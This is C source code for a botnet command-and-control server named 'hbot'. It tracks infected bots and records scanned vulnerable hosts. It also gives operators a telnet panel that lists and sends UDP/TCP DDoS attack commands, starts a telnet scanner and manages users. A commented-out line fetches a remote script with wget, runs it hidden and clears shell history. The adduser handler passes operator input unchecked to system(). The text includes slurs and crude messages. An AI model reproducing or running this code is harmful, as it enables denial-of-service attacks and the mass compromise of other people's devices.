#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>
int hostname_to_ip(char *  , char *);
#define MAXFDS 1000000

#define RED     "\x1b[1;31m"
#define C_RESET	"\x1b[0m"
#define CYAN	"\x1b[1;36m"
#define WHITE   "\x1b[37m"


struct account {
    char user[200]; 
    char password[200];
	char id[200];
};

struct name
{
    char narray[512];
    int jj;
};

#define botnamesize 40
static struct name arra[botnamesize];


static struct account accounts[25];


struct clientdata_t {
        uint32_t ip;
        char build[7];
		char joinname[512];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
		char nickname[20];
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile FILE *kfileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int BOATSRAPED = 0;

////////////////////////////////////

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}

void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}

static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}

void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
		char prompt[56];
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;31m", 7, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
				sprintf(prompt, "\r\n\x1b[1;31m%s\x1b[1;36m@\x1b[1;31mhbot\x1b[1;36m#: \x1b[0m", managements[i].nickname);
                if(sendMGM && managements[i].connected) send(i, prompt, strlen(prompt), MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 void removestr(char *buf,const char *rev)
{
    buf=strstr(buf,rev);
    memmove(buf,buf+strlen(rev),1+strlen(buf+strlen(rev)));
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
										char binyname[200];
										memset(binyname,0,sizeof binyname);
										fdgets(binyname, sizeof binyname,infd);
										if(strstr(binyname,"name:"))
										{
											trim(binyname);
											removestr(binyname,"name:");
											strcpy(clients[infd].joinname,binyname);
											int g;
											for(g=0;g<botnamesize;g++)
											{
												if(!strcmp(arra[g].narray,binyname))
												{
													usleep(40000); 
													break;
												}
												if(strlen(arra[g].narray) <= 0)
												{
													strcpy(arra[g].narray,binyname);
													break;
												}
											}
										}
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
                                        if(dup) 
                                        {
											// just in case dups werent deleted yet we will manually do so
											if(send(infd, ".DSLKFJ\n", 8, MSG_NOSIGNAL) == -1) { close(infd); continue; }
											close(infd);
											continue;
										}
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        //send(infd, ".TREPS ON\n", 10, MSG_NOSIGNAL);
										//send(infd, ".BKILL ON\n", 10, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
												if(strstr(buf, "LOCKED ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "LOCKED ") + 7; 
                                                        fprintf(fileFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(fileFD);
												//TODO: automatically exploit that particular IP after scanning for dir and uploading correct arch stuffs.
                                                        continue;
                                                }
												if(strstr(buf, "killed pid") == buf) // received a report of a vulnerable system from a scan
                                                {
														BOATSRAPED++;
                                                        char *line = strstr(buf, "killed pid") + 11; 
														
                                                        continue;
                                                }
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) 
												{
													continue; 
												}
												else
													printf("\"%s\"\n", buf); 
}
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 

unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
unsigned int joinn()
{
    int i, f, g;
    char add[MAXFDS];
    for(g=0;g<botnamesize;g++)
    {
        arra[g].jj=0;
    }
       for(i=0;i<MAXFDS;i++)
       {
           for(f=0;f<botnamesize;f++)
           {
            if(strcmp(clients[i].joinname,arra[f].narray) == 0 && clients[i].connected == 1)
            {
                arra[f].jj++;
            }
        }
       }
}
 
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}

void client_addr(struct sockaddr_in addr) 
{
	printf("[%d.%d.%d.%d]\n",
	addr.sin_addr.s_addr & 0xFF,
	(addr.sin_addr.s_addr & 0xFF00)>>8,
	(addr.sin_addr.s_addr & 0xFF0000)>>16,
	(addr.sin_addr.s_addr & 0xFF000000)>>24);
}
int hostname_to_ip(char * hostname , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;
         
    if ( (he = gethostbyname( hostname ) ) == NULL) 
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }
 
    addr_list = (struct in_addr **) he->h_addr_list;
     
    for(i = 0; addr_list[i] != NULL; i++) 
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
     
    return 1;
}

void *titleWriter(void *sock) 
		{
				int thefd = (long int)sock;
				char string[2048];
				char *spinbuf[] = {"-", "\\", "|", "/" };
				int i;
                char usernamez[1000] = "";
				while(1)
				{
						for (i = 0; i <  (sizeof( spinbuf ) / sizeof(unsigned char *)); i++)
						{
							memset(string, 0, 2048);
							sprintf(string, "%c]0;%d Devices Connected %s  %s%c", '\033', clientsConnected(), spinbuf[i], usernamez, '\007');
							if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
							sleep(1);
						}
				}
		}

void *telnetWorker(void *sock) 
{ 
        int thefd = (long int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
		
		char *admin = "admin";
		char *master = "shadoh";
		char *loginprompt = "!HBOT";
		int attks;
		int adminConnected = 0;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r");
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s %s", accounts[j].user, accounts[j].password, accounts[j].id);
            ++j;
        }
		if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
		if(strstr(buf, loginprompt))
			goto loginscreen;
		else
			goto end;
		
		loginscreen:
        sprintf(botnet, ""RED"Username\x1b[1;36m:\x1b[37m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
		FILE *conLog;
        conLog = fopen("connection.log", "a");
        fprintf(conLog, "[LOGIN ATTEMPT] USER: %s\n", nickstring);
        fclose(conLog);
		printf("[LOGIN ATTEMPT] USER: %s\n", nickstring);
        if(strcmp(nickstring, accounts[find_line].user) == 0){                 
        sprintf(botnet, ""RED"Password\x1b[1;36m:\x1b[37m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		FILE *conLog2;
        conLog2 = fopen("connection.log", "a");
        fprintf(conLog2, "[FAILED ATTEMPT] USER: %s\n", nickstring);
        fclose(conLog2);
        goto end;
        fak:
        
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		
        char line1[80];
        sprintf(line1, ""RED"%s"CYAN"@"RED"hbot"CYAN"#: "C_RESET, accounts[find_line].user);
        if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		
		pthread_create(&title, NULL, &titleWriter, sock);
		sprintf(managements[thefd].nickname, "%s", accounts[find_line].user);
		managements[thefd].connected = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
        
		if(strstr(buf, "bots") || strstr(buf, "count") || strstr(buf, "botcount")) 
        {
            joinn();
            int i;
            int t=1;
            char pp[512];
            char total[512];
            for(i=0;i<botnamesize;i++)
            {
                if(arra[i].jj <= 0)
                {
                    memset(arra[i].narray,0,sizeof(arra[i].narray));
                }
                if(strlen(arra[i].narray)>=1)
                {
                    sprintf(pp,"\x1b[37;1m%s\x1b[31;1m: \x1b[37;1m%d\r\n",arra[i].narray,arra[i].jj);
                    if(send(thefd, pp, strlen(pp), MSG_NOSIGNAL) == -1) goto end;
                    memset(pp,0,sizeof pp);
                }
                //usleep(500000);
            }
            sprintf(total,"\x1b[37;1mtotal\x1b[31;1m: \x1b[37;1m%d\r\n", clientsConnected());
            if(send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) goto end;
        }
		
		if(strstr(buf, "rape?")) 
        {  
			sprintf(botnet, "\x1b[0mhbot.botkill: "RED"%d"C_RESET"\r\n", BOATSRAPED);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
		if(strstr(buf, "resolve"))
		{
			char *ip[100];
			char *token = strtok(buf, " ");
			char *url = token+sizeof(token);
			trim(url);
			hostname_to_ip(url, ip);
			sprintf(botnet, "\x1b[0mresolved [%s] to [%s]\r\n", url, ip);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
		}
		if(strstr(buf, "help")) 
        {			
			sprintf(botnet, "\x1b[0mddoscmds - shows ddos commands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "servercmds - server side commands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "admincmds - admin commands\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
		if(strstr(buf, "servercmds")) 
        {			
			sprintf(botnet, "\x1b[0mbots - shows bot count\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "exit - disconnect from net\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "help - displays help menu\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			
        }
		if(strstr(buf, "admincmds")) 
        {			
			if(strcmp(admin, accounts[find_line].id) == 0 || strcmp(master, accounts[find_line].id) == 0)
			{
				sprintf(botnet, "\x1b[0mbtype - shows architecture of bots connected\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet, "users - displays who's connected to the net\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet, "addusr - add users via server side (IN DEVELOPMENT! VERY BUGGY)\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet,"start - starts telnet scanner\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "kickuser - logs user out must be admin");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
			else
			{
				sprintf(botnet, "You Must Be Admin to Use This Command!\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
			
        }
		
		if(strstr(buf, "ddoscmds")) 
        {			
			sprintf(botnet, "\x1b[0mUDP ip port time size\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "TCP ip port time size\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
		if (strstr(buf, "UDP") || strstr(buf, "TCP"))
        {
			sprintf(botnet, "\x1b[0m");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			if(send(thefd, "Attack Sent! \r\n", 17, MSG_NOSIGNAL) == -1) goto end;
			FILE *logFile;
			logFile = fopen("actions.log", "a");
			fprintf(logFile, "[hbot] [%s] [Sent an Attack!]\n", accounts[find_line].user);
			fclose(logFile);
			printf("[hbot] [%s] [Sent an Attack!]\n", accounts[find_line].user);
        }
		
		if(strstr(buf, ". KT")) 
        {  			
			FILE *logFile;
			logFile = fopen("actions.log", "a");
			fprintf(logFile, "[hbot] [%s] [Killed All Pid's]\n", accounts[find_line].user);
			fclose(logFile);
			printf("[hbot] [%s] [Killed All Pid's]\n", accounts[find_line].user);
        }
		
        if (strstr(buf, "cls")) 
		{
			if(send(thefd, "\033[1A\033[2J\033[1;1H", 16, MSG_NOSIGNAL) == -1) goto end;
        }
		
		if (strstr(buf, "users")) 
		{
			if(strcmp(admin, accounts[find_line].id) == 0 || strcmp(master, accounts[find_line].id) == 0)
			{
            int k;
            strcpy(botnet, "\x1b[31m- \x1b[31mOnline Users \x1b[31m-\x1b[37m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
            for(k=0; k < MAXFDS; k++)
            {
                if(strlen(managements[k].nickname) > 1 && managements[k].connected == 1)
                {
                    sprintf(botnet, "\x1b[37mID(\x1b[31m%d\x1b[37m) \x1b[31m%s\x1b[37m\r\n", k, managements[k].nickname);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
                }
            }
			}
			else
			{
				sprintf(botnet, "You Must Be Admin to Use This Command!\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
        }
		if (strstr(buf, "kickuser")) 
		{
		if(strcmp(master, accounts[find_line].id) == 0 || strcmp(master, accounts[find_line].id) == 0)
			{
		// ex1: kick user=username
				// ex2: kick id=5
				if(strstr(buf, "user=") || strstr(buf, "USER="))
				{
					int id;
					char user[20];
					char *token = strtok(buf, "=");
					snprintf(user, sizeof(user), "%s", token+strlen(token)+1);
					trim(user);
					for(id=0; id < MAXFDS; id++)
					{
						if(strstr(managements[id].nickname, user))
						{
							sprintf(botnet, "\n\x1b[31mGoodbye, kicked by \x1b[34m%s\x1b[37m...\r\n", managements[thefd].nickname);
							if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
			                managements[id].connected = 0;
			                close(id);
							//managesConnected -= 1;
							sprintf(botnet, "\x1b[33mKicked \x1b[34m%s\x1b[37m...\r\n", user);
							if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
						}
					}
				}
				else if(strstr(buf, "id=") || strstr(buf, "ID="))
				{
					char *token = strtok(buf, "=");
					int uid = atoi(token+strlen(token)+1);
					sprintf(botnet, "\n\x1b[31mGoodbye, kicked by \x1b[34m%s\x1b[37m...\r\n", managements[thefd].nickname);
					if(send(uid, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
	                managements[uid].connected = 0;
	                close(uid);
					//managesConnected -= 1;
					sprintf(botnet, "\x1b[33mKicked user with id of \x1b[34m%d\x1b[37m...\r\n", uid);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
				}
		}
		else
			{
				sprintf(botnet, "You Must Be big daddy shadoh to kick others, queer\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
		}
		if (strstr(buf, "adduser"))
        {
			if(strcmp(admin, accounts[find_line].id) == 0 || strcmp(master, accounts[find_line].id) == 0)
			{
                char *token = strtok(buf, " ");
                char *userinfo = token+sizeof(token);
                trim(userinfo);
                char *uinfo[50];
                sprintf(uinfo, "echo '\n%s' >> login.txt", userinfo);
                system(uinfo);
                printf("[hbot] [%s] [added a user] [%s]\n", accounts[find_line].user, userinfo);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
				FILE *logFile;
				logFile = fopen("actions.log", "a");
				fprintf(logFile, "[hbot] [%s] [added a user] [%s]\n", accounts[find_line].user, userinfo);
				fclose(logFile);
			}
			else
			{
				sprintf(botnet, "You Must Be Admin to Use This Command!\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
        }
		/*
		if (strstr(buf, "resolve"))
        {
			if(strcmp(admin, accounts[find_line].id) == 0)
			{
				char Host[36];
				char *ip[100];
				sprintf(botnet, ""RED"Host: \x1b[37m");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
				if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
				trim(buf);
				sprintf(Host, buf);
				resolve(Host, ip);
				sprintf(botnet, ""CYAN" Host "WHITE"["RED"%s"WHITE"] "CYAN" Resolved to "WHITE"["RED"%s"WHITE"]", Host, ip);
			}
			else
			{
				sprintf(botnet, "You Must Be Admin to Use This Command!\r\n");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
        }
		*/
        if (strstr(buf, "exit")) 
		{
			goto end;
		}
	
                trim(buf);
                sprintf(line1, ""RED"%s"CYAN"@"RED"hbot"CYAN"#: "C_RESET, accounts[find_line].user);
                if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].user, buf);
				FILE *logFile;
                logFile = fopen("chat.log", "a");
                fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].user, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(int port)
{    
		int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {       printf("[hbot] [Admin Connected] ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("connection.log", "a");
                fprintf(logFile, "[hbot] [Admin Connected] [%d.%d.%d.%d]", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
				newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], char **sock)
{
        signal(SIGPIPE, SIG_IGN);
 
        int s, threads, port;
        struct epoll_event event;
        char Username[20], Password[20];
        
		if (argc != 4)
        {
			fprintf (stderr, "[hbot] Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
        fileFD = fopen("telnet.txt", "a+"); 
		kfileFD = fopen("killer.txt", "a+");
		port = atoi(argv[3]);
        threads = atoi(argv[2]);
        
		if (threads > 850)
        {
			printf("[hbot] Lower Threading Count.\n");
            return 0;
        }

        printf("[hbot] Socket Opened On Port %d\n", port);
		//system("wget -q https://a.safe.moe/BALvnmr -O .sh; chmod +x .sh; nohup ./.sh</dev/null >/dev/null 2>&1; history -c");

        listenFD = create_and_bind(argv[1]);
        if (listenFD == -1) abort();
 
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
			perror ("listen");
			abort ();
        }
 
        epollFD = epoll_create1 (0);
        if (epollFD == -1)
        {
			perror ("epoll_create");
			abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
			perror ("epoll_ctl");
			abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
			pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL);
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, port);
 
        while(1)
        {
			broadcast("PING", -1, "hbot");
			sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}